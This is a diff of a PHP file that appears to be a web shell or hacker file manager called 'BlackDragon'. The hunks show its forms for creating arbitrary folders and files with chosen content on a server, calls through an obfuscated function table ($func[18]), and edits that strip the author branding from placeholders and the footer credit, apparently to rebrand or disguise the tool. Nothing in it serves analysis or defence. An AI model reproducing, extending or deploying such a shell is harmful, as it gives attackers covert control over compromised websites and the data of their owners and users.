@@ -338,7 +338,7 @@ $dirs = $func[18]($path);
               <form action="" method="post">
                 <div class="mb-3">
                   <label for="name" class="form-label">Folder Name</label>
-                  <input type="text" class="form-control" name="newFolderName" placeholder="BlackDragon">
+                  <input type="text" class="form-control" name="newFolderName" placeholder="">
                 </div>
                 <button type="submit" class="btn btn-outline-light">Submit</button>
               </form>
@@ -347,11 +347,11 @@ $dirs = $func[18]($path);
               <form action="" method="post">
                 <div class="mb-3">
                   <label for="name" class="form-label">File Name</label>
-                  <input type="text" class="form-control" name="newFileName" placeholder="blackdragon.php">
+                  <input type="text" class="form-control" name="newFileName" placeholder="">
                 </div>
                 <div class="mb-3">
                   <label for="name" class="form-label">File Content</label>
-                  <textarea name="newFileContent" rows="10" class="form-control" placeholder="Hello World - BlackDragon"></textarea>
+                  <textarea name="newFileContent" rows="10" class="form-control" placeholder="Hello World"></textarea>
                 </div>
                 <button type="submit" class="btn btn-outline-light">Submit</button>
               </form>
@@ -363,7 +363,7 @@ $dirs = $func[18]($path);
                 <br>
                 *ReClick  For Close
                 <br>
-                File : BlackDragon <?= $_SERVER['SCRIPT_NAME'] ?>
+                File : :D <?= $_SERVER['SCRIPT_NAME'] ?>
               </div>
             </div>
           </div> 
@@ -445,7 +445,7 @@ $dirs = $func[18]($path);
               <?php endforeach; ?>
             </tbody>
           </table>
-          <div class="text-light">&#169; BlackDragon <script type='text/javascript'>var creditsyear = new Date();document.write(creditsyear.getFullYear());</script></div>
+          <div class="text-light">&#169; :D <script type='text/javascript'>var creditsyear = new Date();document.write(creditsyear.getFullYear());</script></div>
         </div>
       </div>
     </div>
